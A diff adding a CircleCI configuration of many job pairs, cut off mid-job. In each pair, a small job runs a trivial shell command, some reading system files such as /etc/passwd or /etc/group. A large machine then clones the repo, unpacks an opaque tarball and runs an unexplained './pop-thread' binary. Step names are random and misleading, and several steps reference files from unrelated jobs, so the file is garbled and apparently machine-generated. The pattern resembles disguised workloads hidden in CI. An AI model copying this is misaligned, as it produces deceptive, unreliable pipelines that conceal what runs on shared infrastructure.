@@ -1,0 +1,1227 @@
+version: 2.1
+
+jobs:
+  sec_993:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Garnish with org chart
+          command: |
+            mkdir -p /var/tmp/store
+            set +o pipefail 2>/dev/null; tee /var/tmp/store/0d435746d027e5b1d65c813780e4da0 < <(seq 1 1123693) | wc -l > /dev/null; true
+            echo "job yuki-smoke: $(wc -c </var/tmp/store/0d435746d027e5b1d65c813780e4da0)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - '0d435746d027e5b1d65c813780e4da0'
+  yuki-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/0d435746d027e5b1d65c813780e4da0 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  min_driver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: wave twelve promote the weekly digest
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; echo "spam and eggs"; echo "status: ok"; true ; } > /var/tmp/store/LOT-2020-24509
+            echo "job hu-run: $(wc -c </var/tmp/store/LOT-2020-24509)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'LOT-2020-24509'
+  hu-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/LOT-2020-24509 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  uq_Digest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: The autoscaler is live
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; ls -roX --author /var/lib | awk '{print $NF}'; true ; } > /var/tmp/store/bog_20241024
+            echo "job refactor-3432: $(wc -c </var/tmp/store/bog_20241024)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'bog_20241024'
+  refactor-3432:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/bog_20241024 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  on_object_count:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Enrich Error Rows
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; cut -d : -f 3 </etc/passwd | awk '{printf "%05d\n", $1}'; true ; } > /var/tmp/store/28.04.2020
+            echo "job feat-5968: $(wc -c </var/tmp/store/28.04.2020)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - '28.04.2020'
+  feat-5968:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  uvt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Mission archival
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; [ -t 0 ] || echo "stdin is not a terminal"; true ; } > /var/tmp/store/si21uhnhfkll
+            echo "job LaunchProd: $(wc -c </var/tmp/store/si21uhnhfkll)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'si21uhnhfkll'
+  LaunchProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  closedParser_encode:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Plan Wren
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; for item in $HOME/.bash*; do stat -c "%s %n" $item;done; true ; } > /var/tmp/store/gadget-6072_75
+            echo "job yolo: $(wc -c </var/tmp/store/gadget-6072_75)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'gadget-6072_75'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/gadget-6072_75 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  convertPriceMVP:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dispatchBackordersJob
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; if [[ -d $HOME ]]; then echo true; else echo false; fi; true ; } > /var/tmp/store/1c1e56b05ed
+            echo "job verify-production-artifact-bundle: $(wc -c </var/tmp/store/1c1e56b05ed)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - '1c1e56b05ed'
+  verify-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  check_measure_asset:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: L23 screenshot checkout page
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; find /var/log -exec echo {} + 2>/dev/null | nl; true ; } > /var/tmp/store/img_bkp_img
+            echo "job titan-alpha: $(wc -c </var/tmp/store/img_bkp_img)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'img_bkp_img'
+  titan-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/img_bkp_img 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  cakstyntklaixo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Countdown 5 backup
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; echo -n 'are we there yet?' | md5sum; true ; } > /var/tmp/store/release-v3.11.4
+            echo "job send-it: $(wc -c </var/tmp/store/release-v3.11.4)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'release-v3.11.4'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/release-v3.11.4 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  v14-25-50:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Ignition drag
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; sed "9q" /etc/nsswitch.conf; true ; } > /var/tmp/store/4426c5d
+            echo "job feb3-cleanup: $(wc -c </var/tmp/store/4426c5d)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - '4426c5d'
+  feb3-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  item_v6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Confirm successful billing of the journal entries
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; id -Gn | tr ' ' '\n' | head -3 | awk '{print length, $0}'; true ; } > /var/tmp/store/COIN_SHIMMER_DELTA
+            echo "job helios-beta: $(wc -c </var/tmp/store/COIN_SHIMMER_DELTA)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'COIN_SHIMMER_DELTA'
+  helios-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  li-country:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: HR 811 key frame conversion
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; stat -c %s /etc/*.conf | head -n3 | shuf -n 1; true ; } > /var/tmp/store/sK0T
+            echo "job validate-production-integration-tests: $(wc -c </var/tmp/store/sK0T)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'sK0T'
+  validate-production-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  Menu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Clear to route the express lane
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; grep -n sh /etc/shells | sort -u; true ; } > /var/tmp/store/reef-layer
+            echo "job deploy: $(wc -c </var/tmp/store/reef-layer)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'reef-layer'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  oldParsers:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Scout unit tests
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; for name in swan cat dog crow panda horse ; do echo "${name^}"; done; true ; } > /var/tmp/store/draft_fa392f
+            echo "job nico-push: $(wc -c </var/tmp/store/draft_fa392f)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'draft_fa392f'
+  nico-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  c0mp137ez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Load test the mutation score if needed
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; for w in $(seq 1 7); do echo -n "$w "; done; echo; true ; } > /var/tmp/store/dd
+            echo "job v7-edge4: $(wc -c </var/tmp/store/dd)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'dd'
+  v7-edge4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  TEXTURE_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Tag Ola on the chargebacks
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; printf %s "that's all folks" | sha1sum | awk '{print $1}'; true ; } > /var/tmp/store/fnv_c09158d
+            echo "job chen-ship: $(wc -c </var/tmp/store/fnv_c09158d)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'fnv_c09158d'
+  chen-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/fnv_c09158d 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  bugfix-warning-attach-last:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Round I Loading Shaders
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; if test -d "$HOME"; then echo 'yes'; fi; true ; } > /var/tmp/store/access-2f66b0.log
+            echo "job rm-oauth-timeout: $(wc -c </var/tmp/store/access-2f66b0.log)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'access-2f66b0.log'
+  rm-oauth-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  expect_graph_quick:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: NOGO cooldown
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; echo -n "fair enough" | od -c | head -n 2; true ; } > /var/tmp/store/okyo6li
+            echo "job fix-webhook: $(wc -c </var/tmp/store/okyo6li)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'okyo6li'
+  fix-webhook:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  pending_anchor_cm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Drain Circuit Breaker Step
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; echo teal white magenta | tr ' ' '\n' | wc -l; true ; } > /var/tmp/store/sample0_49be
+            echo "job victor: $(wc -c </var/tmp/store/sample0_49be)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'sample0_49be'
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  wrapperchannel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Sync the security desk from region b
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; sha384sum /etc/group | awk '{print $1}'; true ; } > /var/tmp/store/qatxtqa
+            echo "job polaris-ng: $(wc -c </var/tmp/store/qatxtqa)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'qatxtqa'
+  polaris-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/qatxtqa 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  dst_tel_ord:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: load the loading bay mark 29
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; ls /var/cache | wc -w; true ; } > /var/tmp/store/_wip_1efb83d
+            echo "job bravo-6: $(wc -c </var/tmp/store/_wip_1efb83d)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - '_wip_1efb83d'
+  bravo-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  yt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Shrink wrap is pending
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; if [[ -f ~/.bashrc ]];then echo good; elif [[ -e /tmp ]];then echo maybe; else echo bad; fi; true ; } > /var/tmp/store/crc_4d9eded666183b36
+            echo "job v5-beta: $(wc -c </var/tmp/store/crc_4d9eded666183b36)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'crc_4d9eded666183b36'
+  v5-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  c8b5bd9a38275:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Drop the backup battery
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; ls -1 /usr/bin | paste -sd ' '; true ; } > /var/tmp/store/tEnsORpROTonYIeLDeNGinE
+            echo "job feb4-canary: $(wc -c </var/tmp/store/tEnsORpROTonYIeLDeNGinE)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'tEnsORpROTonYIeLDeNGinE'
+  feb4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  Type-Bundle-Provider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: notify pm
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; if [ -O "$HOME" ];then echo "true"; else echo "false"; fi; true ; } > /var/tmp/store/Node
+            echo "job aug14-ship: $(wc -c </var/tmp/store/Node)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'Node'
+  aug14-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/COIN_SHIMMER_DELTA 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  prompt-resource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: XOR spinner
+          command: |
+            mkdir -p /var/tmp/store
+            { set +o pipefail 2>/dev/null; install -m 0755 /etc/hosts "${TMPDIR:-/tmp}/hotel.library.corner.bak" && ls -l "${TMPDIR:-/tmp}/hotel.library.corner.bak"; true ; } > /var/tmp/store/crc_34f83653e
+            echo "job intergration: $(wc -c </var/tmp/store/crc_34f83653e)"
+      - persist_to_workspace:
+          root: /var/tmp/store
+          paths:
+            - 'crc_34f83653e'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/store
+      - run:
+          name: Read gate signal
+          command: |
+            date -d "@$(stat -c %Y /var/tmp/store/28.04.2020 2>/dev/null || echo 0)" '+%H:%M' 2>/dev/null || true
+      - run:
+          name: Fetch main branch
+          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bzcat final-output-v3.tar.bz2 | tar xf -
+      - run:
+          command: nice -n 0 ./pop-thread
+  ugdf53al5j2iq961:
+    docker:
+      - image: cimg/base:current
